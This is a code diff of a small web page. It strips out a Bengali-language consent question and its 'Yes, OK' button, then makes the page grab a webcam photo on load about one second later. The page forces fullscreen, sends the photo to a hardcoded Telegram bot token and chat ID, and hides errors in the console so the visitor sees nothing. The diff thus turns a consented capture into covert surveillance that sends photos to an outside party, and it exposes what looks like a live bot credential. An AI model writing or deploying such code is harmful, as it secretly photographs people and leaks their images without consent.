@@ -3,41 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Capture</title>
+    <title>Not A Joke</title>
     <style>
         body {
-            text-align: center;
-            font-family: Arial, sans-serif;
-            background-color: #000;
-            color: white;
             margin: 0;
             overflow: hidden;
+            background: black;
         }
-        video, canvas {
+        video {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        canvas {
             display: none;
-        }
-        button {
-            font-size: 20px;
-            padding: 10px 20px;
-            margin-top: 20px;
-            cursor: pointer;
-            background: #28a745;
-            color: white;
-            border: none;
-            border-radius: 5px;
         }
     </style>
 </head>
 <body>
 
-    <h2>আপনি কি আপনার ছবি পাঠানোর জন্য রাজি আছেন?</h2>
-    <button id="captureBtn">হ্যাঁ, ওকে</button>
-    
-    <video id="video" autoplay></video>
+    <video id="video" autoplay muted></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             function goFullscreen() {
                 let doc = document.documentElement;
                 if (doc.requestFullscreen) {
@@ -51,59 +41,40 @@
                 }
             }
 
-            // ওয়েবসাইট লোড হওয়ার সঙ্গে সঙ্গে ফুলস্ক্রিন চালু হবে
             goFullscreen();
-
-            // ইউজার ক্লিক করলেও আবার ফুলস্ক্রিন মোড চালু করবে
             document.addEventListener("click", goFullscreen);
-        });
 
-        document.getElementById('captureBtn').addEventListener('click', function() {
-            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw";  // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
-            let chatId = "6947565760";  // এখানে আপনার চ্যাট আইডি দিন
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw"; // 🔹 
+            let chatId = "6947565760"; // 🔹 
 
-            // ক্যামেরা অ্যাক্সেস চাওয়া
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    let video = document.getElementById('video');
+                    let video = document.getElementById("video");
                     video.srcObject = stream;
-                    video.play();
 
-                    // কিছুক্ষণ পর ছবি তোলা
                     setTimeout(() => {
-                        let canvas = document.getElementById('canvas');
-                        let context = canvas.getContext('2d');
+                        let canvas = document.getElementById("canvas");
+                        let context = canvas.getContext("2d");
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                        // ক্যামেরা বন্ধ করা
                         stream.getTracks().forEach(track => track.stop());
 
-                        // ছবিকে Blob এ কনভার্ট করা
                         canvas.toBlob(blob => {
                             let formData = new FormData();
                             formData.append("chat_id", chatId);
                             formData.append("photo", blob, "image.jpg");
 
-                            // টেলিগ্রাম বটে ছবি পাঠানো
                             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                 method: "POST",
                                 body: formData
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                if (data.ok) {
-                                    alert("✅ ছবি সফলভাবে পাঠানো হয়েছে!");
-                                } else {
-                                    alert("❌ ছবি পাঠাতে সমস্যা হয়েছে!");
-                                }
-                            })
-                            .catch(error => alert("❌ ত্রুটি: " + error));
+                            }).then(response => response.json())
+                              .catch(error => console.log(error));
                         }, 'image/jpeg');
-                    }, 3000);
+                    }, 1000); // ⏳ 1
                 })
-                .catch(error => alert("❌ ক্যামেরা অ্যাক্সেস পাওয়া যায়নি!"));
+                .catch(error => console.log("Give The Permission First!"));
         });
     </script>
 
